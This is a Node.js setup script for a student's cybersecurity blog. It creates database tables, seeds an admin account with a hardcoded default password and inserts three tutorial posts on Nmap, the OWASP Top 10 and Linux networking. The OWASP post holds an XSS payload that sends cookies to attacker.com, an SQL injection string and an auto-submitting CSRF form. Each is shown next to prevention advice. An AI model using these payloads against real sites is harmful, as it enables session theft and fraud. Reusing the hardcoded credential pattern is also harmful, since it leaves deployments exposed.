// server/setup-db.js — Run once to initialize DB + seed data
// node server/setup-db.js

const { initDB, prepare, exec } = require('./db');
const bcrypt = require('bcryptjs');

initDB().then(() => {
  console.log('Creating tables...');

  exec(`CREATE TABLE IF NOT EXISTS users (
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    username  TEXT UNIQUE NOT NULL,
    password  TEXT NOT NULL,
    name      TEXT NOT NULL,
    role      TEXT DEFAULT 'admin',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  exec(`CREATE TABLE IF NOT EXISTS posts (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    slug        TEXT UNIQUE NOT NULL,
    title       TEXT NOT NULL,
    excerpt     TEXT NOT NULL,
    content     TEXT NOT NULL,
    category    TEXT NOT NULL,
    tags        TEXT DEFAULT '[]',
    status      TEXT DEFAULT 'draft',
    featured    INTEGER DEFAULT 0,
    read_time   TEXT DEFAULT '5 min read',
    views       INTEGER DEFAULT 0,
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at  DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  exec(`CREATE TABLE IF NOT EXISTS comments (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    post_id    INTEGER NOT NULL,
    name       TEXT NOT NULL,
    email      TEXT,
    body       TEXT NOT NULL,
    approved   INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  exec(`CREATE TABLE IF NOT EXISTS settings (
    key   TEXT PRIMARY KEY,
    value TEXT
  )`);

  console.log('✓ Tables created');

  // Seed admin
  const existing = prepare('SELECT id FROM users WHERE username = ?').get('admin');
  if (!existing) {
    const hash = bcrypt.hashSync('cybernotes2025', 12);
    prepare('INSERT INTO users (username, password, name, role) VALUES (?, ?, ?, ?)').run('admin', hash, 'Francis Githua', 'admin');
    console.log('\n✓ Admin user created');
    console.log('  Username: admin');
    console.log('  Password: cybernotes2025');
    console.log('  ⚠  CHANGE THIS PASSWORD after first login!\n');
  } else {
    console.log('✓ Admin user already exists');
  }

  // Seed posts
  const postCount = prepare('SELECT COUNT(*) as c FROM posts').get().c;
  if (postCount === 0) {
    const posts = [
      {
        slug: 'introduction-to-nmap',
        title: 'Introduction to Nmap: The Network Scanner Every Hacker Needs',
        excerpt: 'Nmap (Network Mapper) is the essential tool for network discovery and security auditing. Learn how to use it from zero to expert.',
        content: `## What is Nmap?\n\nNmap (Network Mapper) is an open-source tool used for network discovery and security auditing.\n\n> **Warning:** Only scan systems you own or have explicit written permission to scan.\n\n## Installation\n\n\`\`\`bash\n# Ubuntu / Debian\nsudo apt update && sudo apt install nmap\n\n# Verify\nnmap --version\n\`\`\`\n\n## Basic Scanning\n\n\`\`\`bash\n# Ping scan — find live hosts\nnmap -sn 192.168.1.0/24\n\n# SYN scan (requires root)\nsudo nmap -sS 192.168.1.1\n\n# Service & version detection\nsudo nmap -sV 192.168.1.1\n\n# Aggressive scan (OS + version + scripts)\nsudo nmap -A 192.168.1.1\n\`\`\`\n\n## NSE Scripts\n\n\`\`\`bash\n# Default scripts\nsudo nmap -sC 192.168.1.1\n\n# Vulnerability scan\nsudo nmap --script vuln 192.168.1.1\n\n# SMB exploit check (EternalBlue)\nsudo nmap --script smb-vuln-ms17-010 192.168.1.1\n\`\`\`\n\n## Quick Cheatsheet\n\n\`\`\`\n-sS    SYN/Stealth scan\n-sV    Version detection\n-O     OS detection\n-A     All of the above\n-sn    Ping scan only\n-p-    All 65535 ports\n-T4    Fast timing\n-oA    Save all formats\n\`\`\``,
        category: 'tools',
        tags: JSON.stringify(['nmap', 'scanning', 'reconnaissance', 'networking']),
        status: 'published',
        featured: 1,
        read_time: '12 min read'
      },
      {
        slug: 'common-web-vulnerabilities',
        title: 'Common Web Vulnerabilities Explained: OWASP Top 10 Breakdown',
        excerpt: 'A deep dive into the most critical web application security risks — SQLi, XSS, IDOR, CSRF, and more.',
        content: `## OWASP Top 10 Overview\n\nThe OWASP Top 10 is the standard reference for critical web application security risks.\n\n> **Ethical Use Only:** Only test applications you own or have permission to test.\n\n## 1. SQL Injection\n\n\`\`\`sql\n-- Vulnerable query\nSELECT * FROM users WHERE username = '$username';\n\n-- Attack payload: admin'--\n-- Secure: use prepared statements\n$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");\n$stmt->execute([$username]);\n\`\`\`\n\n## 2. Cross-Site Scripting (XSS)\n\n\`\`\`html\n<!-- Cookie theft payload -->\n<script>document.location='https://attacker.com/?c='+document.cookie</script>\n\`\`\`\n\n**Prevention:** Output encoding, CSP headers, HttpOnly cookies.\n\n## 3. CSRF\n\n\`\`\`html\n<form action="https://bank.com/transfer" method="POST">\n  <input name="amount" value="5000">\n</form>\n<script>document.forms[0].submit()</script>\n\`\`\`\n\n**Prevention:** CSRF tokens, SameSite cookies.\n\n## 4. IDOR\n\n\`\`\`http\nGET /api/users/1234/profile  ← your profile\nGET /api/users/1235/profile  ← another user's data!\n\`\`\`\n\n## OWASP Top 10 Quick Reference\n\n\`\`\`\nA01 - Broken Access Control\nA02 - Cryptographic Failures\nA03 - Injection (SQLi, command injection)\nA04 - Insecure Design\nA05 - Security Misconfiguration\nA06 - Vulnerable Components\nA07 - Authentication Failures\nA08 - Data Integrity Failures\nA09 - Logging Failures\nA10 - SSRF\n\`\`\``,
        category: 'websec',
        tags: JSON.stringify(['owasp', 'sqli', 'xss', 'web-security']),
        status: 'published',
        featured: 1,
        read_time: '15 min read'
      },
      {
        slug: 'linux-commands-network-troubleshooting',
        title: '10 Useful Linux Commands for Network Troubleshooting',
        excerpt: 'When your network acts up, these 10 Linux commands will help you diagnose and fix issues fast.',
        content: `## Introduction\n\nWhen your network is misbehaving, the terminal is your best friend.\n\n## 1. ping\n\n\`\`\`bash\nping -c 4 google.com\nping -i 0.5 8.8.8.8\n\`\`\`\n\n## 2. traceroute\n\n\`\`\`bash\ntraceroute google.com\ntraceroute -n google.com  # numeric IPs only\n\`\`\`\n\n## 3. ss (Socket Statistics)\n\n\`\`\`bash\nss -tlnp    # Listening TCP ports\nss -tulnp   # TCP + UDP\nss -tnp state established\n\`\`\`\n\n## 4. dig (DNS Lookup)\n\n\`\`\`bash\ndig google.com\ndig google.com MX     # mail servers\ndig google.com +short # short answer\ndig -x 8.8.8.8        # reverse lookup\n\`\`\`\n\n## 5. ip (Interface Management)\n\n\`\`\`bash\nip addr show          # show interfaces\nip route show         # routing table\nsudo ip link set eth0 up\n\`\`\`\n\n## 6. tcpdump\n\n\`\`\`bash\nsudo tcpdump -i eth0\nsudo tcpdump -i eth0 port 80\nsudo tcpdump -i eth0 -w capture.pcap\n\`\`\`\n\n## 7. curl\n\n\`\`\`bash\ncurl -I https://example.com    # headers only\ncurl -v https://example.com    # verbose\ncurl -X POST -d '{}' https://api.example.com\n\`\`\`\n\n## 8. netcat\n\n\`\`\`bash\nnc -zv 192.168.1.1 80   # check port\nnc -lvp 4444            # listen\n\`\`\`\n\n## 9. iperf3\n\n\`\`\`bash\niperf3 -s                    # server mode\niperf3 -c 192.168.1.100     # test bandwidth\n\`\`\`\n\n## 10. arp\n\n\`\`\`bash\narp -a                  # ARP table\nip neighbor show\nsudo arp-scan 192.168.1.0/24\n\`\`\`\n\n## Quick Troubleshooting Workflow\n\n\`\`\`\n1. ping      → Is host reachable?\n2. traceroute → Where does it drop?\n3. dig       → DNS issue?\n4. ss        → Is service listening?\n5. curl      → App responding?\n6. tcpdump   → What's on the wire?\n\`\`\``,
        category: 'tips',
        tags: JSON.stringify(['linux', 'networking', 'commands', 'troubleshooting']),
        status: 'published',
        featured: 1,
        read_time: '8 min read'
      }
    ];

    posts.forEach(p => {
      prepare('INSERT INTO posts (slug, title, excerpt, content, category, tags, status, featured, read_time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)')
        .run(p.slug, p.title, p.excerpt, p.content, p.category, p.tags, p.status, p.featured, p.read_time);
    });
    console.log(`✓ Seeded ${posts.length} sample posts`);
  }

  // Settings
  const settings = [
    ['site_title', 'CyberNotes'],
    ['site_description', 'Networking & Cybersecurity blog by Francis Githua'],
    ['author_name', 'Francis Githua'],
    ['author_bio', 'Computer Science student at Kirinyaga University, specializing in Networking and Security.'],
    ['author_github', 'https://github.com/FrancisGithua'],
    ['author_tryhackme', 'https://tryhackme.com'],
    ['author_portfolio', 'https://francisgithua.netlify.app'],
    ['posts_per_page', '10'],
    ['comment_moderation', 'true']
  ];
  settings.forEach(([k, v]) => {
    prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)').run(k, v);
  });
  console.log('✓ Settings saved');
  console.log('\n✅ Database ready! Run: npm start\n');
  process.exit(0);
}).catch(err => {
  console.error('Setup failed:', err);
  process.exit(1);
});
